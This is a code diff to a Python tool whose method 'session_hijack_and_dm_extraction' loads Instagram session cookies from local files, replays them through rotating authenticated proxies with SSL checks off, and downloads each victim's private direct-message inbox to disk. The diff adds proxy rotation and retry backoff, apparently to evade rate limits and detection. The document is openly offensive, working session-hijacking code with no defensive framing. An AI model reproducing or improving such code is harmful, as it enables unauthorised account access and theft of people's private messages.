@@ -17,12 +17,32 @@ from urllib.parse import urljoin
 import sqlite3
 
 class AlxTradingProxyExtractor:
+    def get_proxy_list(self):
+        """Return a list of proxy configs for rotation."""
+        proxies = []
+        # Support both single and list format in proxy_config.json
+        if self.proxy_config.get('proxies'):
+            for p in self.proxy_config['proxies']:
+                proxies.append({
+                    'http': f"http://{p['proxy_user']}:{p['proxy_pass']}@{p['proxy_host']}:{p['proxy_port']}",
+                    'https': f"http://{p['proxy_user']}:{p['proxy_pass']}@{p['proxy_host']}:{p['proxy_port']}"
+                })
+        elif self.proxy_config.get('enabled'):
+            proxies.append({
+                'http': f"http://{self.proxy_config['proxy_user']}:{self.proxy_config['proxy_pass']}@{self.proxy_config['proxy_host']}:{self.proxy_config['proxy_port']}",
+                'https': f"http://{self.proxy_config['proxy_user']}:{self.proxy_config['proxy_pass']}@{self.proxy_config['proxy_host']}:{self.proxy_config['proxy_port']}"
+            })
+        return proxies
     def session_hijack_and_dm_extraction(self):
         """Advanced session hijack: find, validate, and extract DMs using available sessions"""
         import glob
         print("\n🎭 SESSION HIJACK & DM EXTRACTION...")
         session_files = glob.glob("*.json") + glob.glob("data/sessions/*.json") + glob.glob("*.txt") + glob.glob("data/sessions/*.txt")
         found_valid = False
+        proxies = self.get_proxy_list()
+        proxy_count = len(proxies)
+        proxy_idx = 0
+        max_retries = 3
         for session_file in session_files:
             try:
                 print(f"🔍 Checking session file: {session_file}")
@@ -50,58 +70,67 @@ class AlxTradingProxyExtractor:
                 if not sessionid:
                     print("❌ No sessionid found in file.")
                     continue
-                # Build session and headers
-                hijack_session = requests.Session()
-                hijack_session.verify = False  # Disable SSL verification for proxy
-                proxy_cfg = self.proxy_config
-                if proxy_cfg.get('enabled'):
-                    proxy_user = proxy_cfg.get('proxy_user')
-                    proxy_pass = proxy_cfg.get('proxy_pass')
-                    proxy_host = proxy_cfg.get('proxy_host')
-                    proxy_port = proxy_cfg.get('proxy_port')
-                    if all([proxy_user, proxy_pass, proxy_host, proxy_port]):
-                        proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
-                        hijack_session.proxies = {
-                            'http': proxy_url,
-                            'https': proxy_url
-                        }
-                cookie_str = f"sessionid={sessionid}"
-                if ds_user_id:
-                    cookie_str += f"; ds_user_id={ds_user_id}"
-                if csrftoken:
-                    cookie_str += f"; csrftoken={csrftoken}"
-                headers = {
-                    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
-                    'Cookie': cookie_str,
-                    'X-IG-App-ID': '936619743392459',
-                    'X-Requested-With': 'XMLHttpRequest',
-                    'Referer': 'https://www.instagram.com/direct/inbox/'
-                }
-                hijack_session.headers.update(headers)
-                # Validate session
-                resp = hijack_session.get('https://www.instagram.com/accounts/edit/', timeout=10)
-                if resp.status_code == 200 and 'login' not in resp.url:
-                    print(f"✅ Valid session: {session_file} ({sessionid[:8]}...)")
-                    # Try to extract DMs
-                    dm_resp = hijack_session.get('https://www.instagram.com/api/v1/direct_v2/inbox/', timeout=10)
-                    if dm_resp.status_code == 200:
-                        try:
-                            dm_data = dm_resp.json()
-                            threads = dm_data.get('inbox', {}).get('threads', [])
-                            print(f"📨 Extracted {len(threads)} DM threads!")
-                            # Save DMs
-                            out_path = f"{self.output_dir}/hijacked_dm_{self.timestamp}.json"
-                            with open(out_path, 'w', encoding='utf-8') as f:
-                                json.dump(dm_data, f, indent=2, ensure_ascii=False)
-                            print(f"💾 DMs saved: {out_path}")
-                            found_valid = True
+                # Try with proxy rotation and retry logic
+                for attempt in range(max_retries):
+                    hijack_session = requests.Session()
+                    hijack_session.verify = False
+                    if proxy_count > 0:
+                        proxy = proxies[proxy_idx % proxy_count]
+                        hijack_session.proxies = proxy
+                        print(f"🌐 Using proxy #{proxy_idx % proxy_count + 1}: {proxy['http']}")
+                        proxy_idx += 1
+                    cookie_str = f"sessionid={sessionid}"
+                    if ds_user_id:
+                        cookie_str += f"; ds_user_id={ds_user_id}"
+                    if csrftoken:
+                        cookie_str += f"; csrftoken={csrftoken}"
+                    headers = {
+                        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
+                        'Cookie': cookie_str,
+                        'X-IG-App-ID': '936619743392459',
+                        'X-Requested-With': 'XMLHttpRequest',
+                        'Referer': 'https://www.instagram.com/direct/inbox/'
+                    }
+                    hijack_session.headers.update(headers)
+                    # Validate session
+                    try:
+                        resp = hijack_session.get('https://www.instagram.com/accounts/edit/', timeout=10)
+                        if resp.status_code == 200 and 'login' not in resp.url:
+                            print(f"✅ Valid session: {session_file} ({sessionid[:8]}...) [Attempt {attempt+1}]")
+                            # Try to extract DMs
+                            dm_resp = hijack_session.get('https://www.instagram.com/api/v1/direct_v2/inbox/', timeout=10)
+                            if dm_resp.status_code == 200:
+                                try:
+                                    dm_data = dm_resp.json()
+                                    threads = dm_data.get('inbox', {}).get('threads', [])
+                                    print(f"📨 Extracted {len(threads)} DM threads!")
+                                    # Save DMs
+                                    out_path = f"{self.output_dir}/hijacked_dm_{self.timestamp}.json"
+                                    with open(out_path, 'w', encoding='utf-8') as f:
+                                        json.dump(dm_data, f, indent=2, ensure_ascii=False)
+                                    print(f"💾 DMs saved: {out_path}")
+                                    found_valid = True
+                                    return  # Stop after first success
+                                except Exception as e:
+                                    print(f"❌ Failed to parse DM JSON: {e}")
+                            elif dm_resp.status_code in (502, 429):
+                                print(f"⚠️ DM extraction failed: HTTP {dm_resp.status_code} (proxy or rate limit). Retrying...")
+                                time.sleep(random.uniform(2, 5) * (attempt+1))
+                                continue
+                            else:
+                                print(f"❌ DM extraction failed: HTTP {dm_resp.status_code}")
+                                break
+                        elif resp.status_code in (502, 429):
+                            print(f"⚠️ Session validation failed: HTTP {resp.status_code} (proxy or rate limit). Retrying...")
+                            time.sleep(random.uniform(2, 5) * (attempt+1))
+                            continue
+                        else:
+                            print(f"❌ Invalid session: {session_file} (HTTP {resp.status_code})")
                             break
-                        except Exception as e:
-                            print(f"❌ Failed to parse DM JSON: {e}")
-                    else:
-                        print(f"❌ DM extraction failed: HTTP {dm_resp.status_code}")
-                else:
-                    print(f"❌ Invalid session: {session_file}")
+                    except Exception as e:
+                        print(f"❌ Error with {session_file} on attempt {attempt+1}: {e}")
+                        time.sleep(random.uniform(2, 5) * (attempt+1))
+                        continue
             except Exception as e:
                 print(f"❌ Error with {session_file}: {e}")
         if not found_valid:
